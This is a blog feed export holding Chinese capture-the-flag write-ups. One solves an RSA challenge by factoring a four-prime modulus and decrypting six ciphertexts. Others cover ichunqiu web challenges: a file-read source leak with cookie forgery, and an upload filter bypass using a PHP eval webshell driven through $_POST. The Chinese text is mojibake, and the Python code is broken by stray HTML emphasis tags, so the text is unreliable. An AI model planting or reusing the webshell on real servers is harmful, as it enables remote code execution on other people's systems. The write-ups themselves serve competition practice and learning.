æ‰€ä»¥$M=1392$.<br>æˆ‘ä»¬ç°åœ¨å¯ä»¥åšä¸€äº›æ•°å­¦ï¼Œçœ‹çœ‹ä»€ä¹ˆä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‘†è„± 4 äºŒè¿›åˆ¶åºåˆ—ï¸°</p><p>$$ N = (2^M + a)(2^M +b)(2^M +c)(2^M +d) $$</p><p>$$ N = 2^{4M} + 2^{3M}(a + b + c + d) + 2^{2M}(ab + ac + ad + bc + bd + cd) + 2^M(bcd + acd + abd + abc) + abcd $$</p><p>è®©ï¸°<br>$$ p = a + b + c + d $$</p><p>$$ q = ab + ac + ad + bc + bd + cd $$</p><p>$$ r = bcd + acd + abd + abc $$</p><p>$$ s = abcd $$</p><p>ä½ ä¼šå¿ä¸ä½æƒ³ä¸Šè¿° 4 çš„äºŒè¿›åˆ¶å­—ç¬¦åºåˆ—å¯¹åº”ç›´æ¥åˆ°$p$ï¼Œ $q$ï¼Œ $r$ï¼Œ $s$ ï¼Œä½†è¿™é‡Œé¢æœ‰è¹Šè··ï¸° åªæœ‰$s$ç­‰äºå…¶å„è‡ªçš„äºŒè¿›åˆ¶åºåˆ—ã€‚<br>å…¶ä»–çš„å¯èƒ½ä¼šåœ¨ 0 æˆ–æ›´å¤šï¼Œå› ä¸ºå¥‡æ•°å¶æ•°æœ‰ç”šè‡³æ€»å’Œã€‚æˆ‘ä»¬å¯ä»¥åªæ˜¯å¼ºåˆ¶æ€§ï¼Œä½†å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šæ‹…å¿ƒä»¥åã€‚<br>æˆ‘ä»¬å¦‚ä½•æ‰¾å‡º$a$ï¼Œ $b$ï¼Œ$c$å’Œ$d$ç»™å®š$p$ï¼Œ $q$ï¼Œ $r$ ï¼Œ $s$ï¼Ÿé«˜ä¸­æ•°å­¦çš„æ•‘æ´ï¸°</p><p>$$ (X - x_1)(X - x_2)(X - x_3)(X - x_4) = 0 $$</p><p>$$ X^4 -(x_1 + x_2 + x_3 + x_4)X^3 + (x_1 x_2 + x_1 x_3 + x_1 x_4 + x_2 x_3 + x_2 x_4 + x_3 x_4)X^2 - (x_2 x_3 x_4 + x_1 x_3 x_4 + x_1 x_2 x_4 + x_1 x_2 x_3)X + x_1 x_2 x_3 x_4 = 0 $$<br>import math<br>import gmpy2<br>gmpy2.get_context().precision=5000<br>from polycubicroot import *<br>def Carpenter(p, q,r, s):<br>p = gmpy2.mpfr(p)<br>q = gmpy2.mpfr(q)<br>r = gmpy2.mpfr(r)<br>s = gmpy2.mpfr(s)<br>â€œâ€â€<br>Solves for all roots of the quartic polynomial P(x) = x^4 + px^3 + qx^2 + rx + s.<br>â€œâ€â€<br>#print â€œ@@@ inside Carpenterâ€, p,q,r,s<br>pby4 = p/4.0<br>C = ((6 * pby4) - 3<em>p)<em>pby4 + q<br>D = (((-4</em>pby4) + 3</em>p)<em>pby4 - 2</em>q)<em>pby4 + r<br>E = (((pby4 - p)</em> pby4 + q)<em>pby4 - r)<em>pby4 + s<br>#print â€œC, D, E=â€,C, D, E<br>root = None<br>for zero in polyCubicRoots(2</em>C, (C**2 - 4</em>E), -D<strong>2):<br>#print â€œzero = â€œ, zero<br>if type(zero)== type(gmpy2.mpfr(1.0)) and zero &gt; 0.0:<br>root = zero<br>#print â€œfound a positive root.â€<br>break<br>if root == None:<br>return None<br>sqroot = gmpy2.sqrt(root)<br>Q1 = -root/4.0 - C/2.0 - D/2.0 / sqroot<br>Q2 = -root/4.0 - C/2.0 + D/2.0 / sqroot<br>#print â€œQ1,Q2=â€, Q1, Q2<br>sqy2 = sqroot/2.0<br>if Q1 &gt;= 0.0:<br>sqQ1 = gmpy2.sqrt(Q1)<br>z1 = sqy2 + sqQ1 -pby4<br>z2 = sqy2 - sqQ1 -pby4<br>else:<br>sqQ1 = gmpy2.sqrt(-Q1)<br>z1 = (sqy2-pby4, sqQ1)<br>z2 = (sqy2-pby4, - sqQ1)<br>if Q2 &gt;= 0.0:<br>sqQ2 = gmpy2.sqrt(Q2)<br>z3 = -sqy2 - sqQ2 -pby4<br>z4 = -sqy2 + sqQ2 -pby4<br>else:<br>sqQ2 = gmpy2.sqrt(-Q2)<br>z3 = (-sqy2-pby4, sqQ2)<br>z4 = (-sqy2-pby4, -sqQ2)<br>return (z1, z2,z3, z4)<br>å¾—åˆ°ä¸€ä¸ª 4 å…ƒç»„è§£å’Œå¾ªç¯çš„å·¦ä¾§å’Œå³ä¾§çš„ä»»ä½• 4 æ ¹ï¼Œçœ‹çœ‹æ˜¯å¦æˆ‘ä»¬å¾—åˆ°çš„é™¤æ•°$s$ï¼Œåº”å®Œå…¨$a b c d$ã€‚å¦‚æœæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªç„¶ååŸºæœ¬ä¸Šè§£å†³é—®é¢˜ã€‚<br>å‰©ä¸‹çš„å”¯ä¸€é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å¤šå°‘é›¶ç‚¹çš„æ¯ä¸ª$p$ï¼Œ $q$ ï¼Œ$r$æœ‰ã€‚è®©æˆ‘ä»¬è¯•ç€ä» 3 é›¶ 0 é›¶çš„æ‰€æœ‰ç»„åˆï¸°<br>p= 0b10001110000110111100100111111000100111<br>q= 0b1110110010101000100001010011110000010100100010111011100111100011010001010101<br>r= 0b1010111100101001100011011101101000000110011010100010001010001100010000111001010011110111011000110010000110010001<br>s= 0b11000010011110000010000010000101010000011101100011101110110110011111000000001011001101111100111001111110001100100101101010011011011101110111001110101<br>A=[]<br>B=[]<br>C=[]<br>D=[s]<br>for i in range(0,3):<br>A.append(p * (2**i))<br>B.append(q * (2</strong>i))<br>C.append(r * (2**i))<br>for i in A:<br>print â€œ====================â€<br>for j in B:<br>for k in C:<br>for l in D:<br>(x1, x2, x3, x4) = Carpenter(-i,j,-k,l)</p><h1 id="since-sometimes-the-solution-will-consist-of-complex-numbers-weâ€™ll-just-disregard-those-with-a-try-except"><a href="#since-sometimes-the-solution-will-consist-of-complex-numbers-weâ€™ll-just-disregard-those-with-a-try-except" class="headerlink" title="since sometimes the solution will consist of complex numbers, weâ€™ll just disregard those with a try-except"></a>since sometimes the solution will consist of complex numbers, weâ€™ll just disregard those with a try-except</h1><p>try:<br>#approximate value of x1<br>aprox = int(x1.<strong>floor</strong>())<br>for step in range(0,10000):<br>#try to the right<br>if s % (aprox + step) == 0:<br>print aprox + step<br>#and to the left<br>if s % (aprox - step) == 0:<br>print aprox - step<br>except:<br>pass</p><p>è¿™æ ·æˆ‘ä»¬å¾—åˆ°äº†æ‰€æœ‰çš„å››ä¸ªå› ç´  ï¼è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™äº›å®é™…ä¸Šå°†å¼¥è¡¥$N$. è€Œä¸”åˆšå¥½å¯¹åº”6ä¸ªå¯†æ–‡<br>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¯†æ–‡çš„å†…å®¹æœ‰å…³äºåŒä¸€å¯†é’¥ä½œä¸ºå¼¹æ€§æ¨¡é‡ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ä»–ä»¬ä¸ã€‚è¿™æ„å‘³ç€ï¼Œè¦ä¹ˆ</p><p>æŒ‡æ•°æ˜¯å° (è¯´ 3) å’Œæ¶ˆæ¯$m$æ˜¯çœŸçš„å¾ˆçŸ­ã€‚ä½†ç„¶åè¿˜æœ‰ä¸€ä¸ªä¸»è¦çš„é—®é¢˜ï¸° å› ä¸ºæ ¹æœ¬ä¸ä¼šè¢«åŠ å¯†æ˜æ–‡$m^3$å°†å°äº$N$æ‰€ä»¥$ m^3 $ç­‰äº$ m^3 \bmod N $(æ²¡æœ‰åŠ å¯† = = å)<br>æŒ‡æ•°æ˜¯ä¸€ä¸ªä½“é¢çš„å¤§å° (é€šå¸¸æ˜¯ 65537) ä½†æ¨¡é‡ä¸æ˜¯$N$ã€‚é‚£ä¹ˆå®ƒæ˜¯ä»€ä¹ˆï¼Ÿæç¤ºï¸° å¯†ç å¯†é’¥ï¼Œå¤§çº¦æ˜¯ä¸€åŠçš„æ¨¡é‡ã€‚<br>ç”±äºæœ‰ 4 è´¨æ•°æˆ‘ä»¬å¯ä»¥ä½œå‡ºä»¥ä¸‹æ¨¡é‡ï¸° $ab $ $ ac $ $ ad $ $ bc $ $ bd $ $ cd$ã€‚å…­æ¨¡é‡ï¼Œå…­ä¸ªå¯†ç æ–‡æœ¬ ï¼</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f1 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686599733</span></span><br><span class="line">f2 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686598461</span></span><br><span class="line">f3 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686597791</span></span><br><span class="line">f4 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686600843</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">136463296143190893248608270448493439350683115492680876168052084053504347848230208722375209906076869052896867483336405778205506777456239889195254751404720423599579856449118314029926341504368322006603240157122006887052352260584975471045726061549619820648607756554188235927302932154082823424745427535138517580059079182622982686168676727690710935334448342460007367100561867135456783067679052102951400317012276135721843672557488711786097028300122487504246207343408690682175135816894247936690735246673985277504237071409859401185555290479154689954442396078547166388871978321863215123445269948324347122830270551854130365741961149443091305418900821360286967705810624380568422193310901491451664233271486835428015602712828527839237760712498204208114606471362410690870710499020885304151928570632315330437235330924071236528549152143092328833484016372976817809299430339752106123272706667690980774118545338761390919046832338928913059106351087015273177895380149217373395580948428521961929052291618261409715145038026920685297885235683434107218249548518659574493203836870070093674704878498465104238178877833471640168999551981025958271865584457582649595664499635489167898398826429084686279399959537724187268210760718340639939389766681703213695409551029265784749153180083564347733676434492122290166926822855552175712346350104533901079605669192289178418165584907326210349152609265563881542151049862642882025360604692084264752182798892702414638180781403398216616666472863758371330058299406233359567750413748257953598843651612399709945608339073191578573877985362619301768016485017815171486743934037935902150228210340093187387036580763941637989511155597643722984057627086517479392172108031663245553269</span></span><br><span class="line"></span><br><span class="line">enc_1 = <span class="number">7106898334865955962704663230185766445951889978440527670379641714370681285859949869949187832359082523864224641583685587358279064795569170851524374568027152395396233789347594775999482749460592054691082921627513982308507181335532299134140407681024881476418889411780375090299905813982101694827597560498543197874412334623795312307111560405270260391658994764065881380399694265015620683173527502434421206862766543229116921174206929733891873772589067987314963792051855633244006474202333168597001157421208180748203884266562430752691702675420434792273754214010918653607624500201387229281379420620532777072560178585294886033718995698223904867539921848198115466603585461755489085844144950962514847839122794545452937035169471880080923607755994138855467643267829059636266176328056201003864357129609343207959211080595752950950566686954867562406898169012</span></span><br><span class="line"></span><br><span class="line">enc_2 = <span class="number">6049049661741129561339303988250162617703359741970199356749378099535308799521119296163475813567458644038456685905251522625056377260310087845057811228022836098917570328692580410899852889868960996513905266043335963520913743708134923879544500911079066640658342641576456724637857109609913138972587873848795314132791317122747052648231297078735128282339170389129703582587817548539040826603188468662975329145727078616857156409325283263490433476018586450960082502578543327451065633585123695731081960986876439520499678158646526292218543279767834119677467758578802705169018711527506297869276113561542222807369071584959189923897216079505316482443445467837921144205079761354928950270172051270453170856002545491432278972735662895438668870901370521394906635478044848448535690635490093836659267778026686404695474454443310769209580317339039949689309577128</span></span><br><span class="line"></span><br><span class="line">enc_3 = <span class="number">9297802808564228678857927735224258610176831223455462482108153962953283311112501933779642540831558523911908205264682548531027493458025348252477502958948277516597689610204247227516319189048436710254675204218913508162139428248916620471317757210444645620644754294112426431692939788347835259617673728076204145049918767636122119264147566892091600628134179775710906591426338082246629946748851355701691716873854064848390273287305765646761438968986164159947841015011854342290060053810459830057357847548324695563067411557873081187572229935066117850179208775004384867270372650455853756560763012162682268812544173997311505136324203900399349629488710197844813293107115270398692552357803651576615589484454781227778727051440858478438251726051391317986762487421941570502251822920317312304622541764818356928105898291743494415190324388360012261032469805293</span></span><br><span class="line"></span><br><span class="line">enc_4 = <span class="number">713095983409993528016630065648951013409887429450761159296479210782308084847050785300379490902448647458053364322993274237841476340954537003347555548992827654062094884577630320399338426853024680425709980978726290825928571411715417634212022523987025390940108095446209802316068849127107378425087055832984628808129531097287891984529260048649164000341136589805930287941174070455962380115617312855801447326371361475429811263285218112383055283949280091896985779211927696867430269968278138068400828124612158603851472016327854927370226178776190765638542240547246882872033038792494915187774790763271179846203704834184269540668646905004118327597860873987248913148268250014480899515845595580486997925049895214602419037682253683176691877538075243485739730794370764108792093424342949560517002862934953109055108423633725444594683266260073663364732952255</span></span><br><span class="line"></span><br><span class="line">enc_5 = <span class="number">10309778311674135836145162475142299890445328570998831868156889990227275287204954712195141311549279047953844775828171871944522109110470024787792366772581241453340259883183812924297131077506375091086889140550405275547002202216935333211274901846970064522877611909017778486075399188006657623263902100044828896866180655435221665929435914366779334701622735670714649165956831390471034827078404866534094264914677879030956272977839491780410171625330771079943455183946885337962048237633491024513227027839179415230496573264968451527246966618074421625677382526573096067979952606553854268016651712174361578916100364115941853700612277618158243626702349480460819792765645689509997114148748479096516230468934427015454217368508102362912163051749856763103972010705773880053579573724226945229453471505368052572019992934401394664840254259798167531746190494146</span></span><br><span class="line"></span><br><span class="line">enc_6 = <span class="number">8939535907261295438433886577386432968291926162277924912979941380189504000322310159787894619015550096747658897136943700072192920334615223423230154197591756541966832740944457435736068401948276698864982347929802551347213730712997519211436818145872722485367264219104124473346589051164722340414948298088909961344463800461486219156960782319672049123860381674970981713865865119998917955886468613202521879160392276542945726096267432761588212550950818569769983241315782390152313705093940640027041352082844550311829177150159737347964813330180325283882516072009654288888676591648012847062527444169352000893928289409020106115561912814987882374652419114381836807085680725260815445689968522849732254659773192714360607196619281714422460754645088867512471482029657153787836396684484646302575186890717770078233479877360251173401000006298555695416782863190</span></span><br><span class="line"></span><br><span class="line">N = f3 * f4</span><br><span class="line">phi = (f3<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_1, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f2 * f4</span><br><span class="line">phi = (f2<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_2, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f1 * f4</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f4<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_3, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">N = f1 * f3</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f3<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_4, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f1 * f2</span><br><span class="line">phi = (f1<span class="number">-1</span>)*(f2<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_5, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = f2 * f3</span><br><span class="line">phi = (f2<span class="number">-1</span>)*(f3<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="keyword">print</span> `hex(pow(enc_6, d, N))`[<span class="number">3</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç®€å•çš„æ‹¿åˆ°äº†flag</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™¾åº¦æ¯ CTFå¤ºæ——å¤§èµ› ---ichunqiu</title>
      <link href="2016-ichunqiu-September.html"/>
      <url>2016-ichunqiu-September.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ç¬¬ä¸€å‘¨</p><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-18-22.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-18-22.jpg"></a></p><p>ä»€ä¹ˆæ–‡ä»¶éƒ½èƒ½ä¸Šä¼  ä½†æ˜¯è¿‡æ»¤äº† &lt;ï¼Ÿå’Œphp  </p><p>ä¸Šä¼  å†…å®¹ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;pHp&gt;$a &#x3D; chr(&quot;97&quot;).ssert;$a($_POST[a]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>å¯†ç ä¸ºa èœåˆ€è¿ä¸€ä¸‹  æŸ¥çœ‹æºä»£ç èƒ½çœ‹åˆ°ä¸Šä¼ åœ°è´¨ä¸º /u/1.php</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-36-46.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-36-46.jpg"></a></p><p>å°±èƒ½æ‰¾åˆ°flagäº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-37-21.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-37-21.jpg"></a></p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>è¿™æ˜¯ä¸€ä¸ªåŸé¢˜  è¿˜å¥½ç©äº†NUCAçš„ç»ƒä¹ èµ›<br>[åŸé¢˜é“¾æ¥</p><p>](<a href="http://www.hetianlab.com/html/news/news-2016072907.html">http://www.hetianlab.com/html/news/news-2016072907.html</a>)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-40-51.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-40-51.jpg"></a></p><p>æ„é€ view-source:<a href="http://909016d9650e4ced96fbbfc0b0f61f69d1996142d4d34845.game.ichunqiu.com/index.php?jpg=index.php%E5%B9%B6%E8%A7%A3%E7%A0%81%E3%80%82%E5%BE%97%E5%88%B0index.php%E7%9A%84%E6%BA%90%E7%A0%81%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA">http://909016d9650e4ced96fbbfc0b0f61f69d1996142d4d34845.game.ichunqiu.com/index.php?jpg=index.phpå¹¶è§£ç ã€‚å¾—åˆ°index.phpçš„æºç å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤º</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016-09-03-22-42-59.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016-09-03-22-42-59.jpg"></a><br>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ­£åˆ™ å°† <code>-</code> æ”¹ä¸º<code>config</code> è¿™ä¸ªæ­£åˆ™ç­‰ä¸‹ä¼šç”¨åˆ° </p><p>ç„¶åæ ¹æ®åŸé¢˜çš„writeup è¿™ä¸ªé¢˜ç›®åº”è¯¥ä¹Ÿæ˜¯æœ‰ä¸€ä¸ª<code>.idea/workspace.xml</code>çš„æ–‡ä»¶æ³„éœ²<br>æˆ‘ä»¬è®¿é—®ä¸€ä¸‹ </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-46-39.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-46-39.jpg"></a></p><p>æˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªåå­—å«<code>fl3g_ichunqiu.php</code>çš„æ–‡ä»¶  æ ¹æ®wp  æˆ‘ä»¬çŸ¥é“è¿™æ˜¯ä¸€ä¸ªåŠ å¯†ç®—æ³•æ–‡ä»¶ è¯»å–ä¸€ä¸‹ æ ¹æ® ä¸Šé¢çš„æ­£åˆ™ æˆ‘ä»¬çŸ¥é“ åº”è¯¥è®¿é—®çš„æ˜¯<code>index.php?jpg=fl3gconfigichuqiu.php</code> å†è§£ç å¾—åˆ°åŠ å¯†å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">* Created by PhpStorm. </span></span><br><span class="line"><span class="comment">* Date: 2015/11/16 </span></span><br><span class="line"><span class="comment">* Time: 1:31 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span>) </span>&#123; </span><br><span class="line">   $hash = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">   $max = strlen($chars) - <span class="number">1</span>; </span><br><span class="line">   <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)&#123; </span><br><span class="line">       $hash .= $chars[mt_rand(<span class="number">0</span>, $max)]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> $hash; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$txt,$key</span>)</span>&#123; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       $tmp .= chr(ord($txt[$i])+<span class="number">10</span>); </span><br><span class="line">   &#125; </span><br><span class="line">   $txt = $tmp; </span><br><span class="line">   $rnd=random(<span class="number">4</span>); </span><br><span class="line">   $key=md5($rnd.$key); </span><br><span class="line">   $s=<span class="number">0</span>; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>; </span><br><span class="line">       $ttmp .= $txt[$i] ^ $key[++$s]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> base64_encode($rnd.$ttmp); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$txt,$key</span>)</span>&#123; </span><br><span class="line">   $txt=base64_decode($txt); </span><br><span class="line">   $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">   $txt = substr($txt,<span class="number">4</span>); </span><br><span class="line">   $key=md5($rnd.$key); </span><br><span class="line"></span><br><span class="line">   $s=<span class="number">0</span>; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123; </span><br><span class="line">       <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>; </span><br><span class="line">       $tmp .= $txt[$i]^$key[++$s]; </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123; </span><br><span class="line">       $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>); </span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> $tmp1; </span><br><span class="line">&#125; </span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">&#x27;user&#x27;</span>],$key); </span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;system&#x27;</span>)&#123; </span><br><span class="line">   <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   setcookie(<span class="string">&#x27;user&#x27;</span>,encrypt(<span class="string">&#x27;guest&#x27;</span>,$key)); </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Ã¢Â•Â®(Ã¢Â•Â¯Ã¢Â–Â½Ã¢Â•Â°)Ã¢Â•Â­&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åç”¨wpçš„poc å¾—åˆ°äº†16ä¸ªåŠ å¯†å¯†æ–‡  ç”¨burpè·‘ä¸€ä¸‹å°±èƒ½å¾—åˆ°flagäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;92b5f008-4cfb-4f16-abdb-3475e2d0f543&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h1><p>MD  ä»€ä¹ˆYeserCMS æ˜æ˜æ˜¯cmseasy</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-09-03-22-58-52.jpg" class="gallery-item"><img 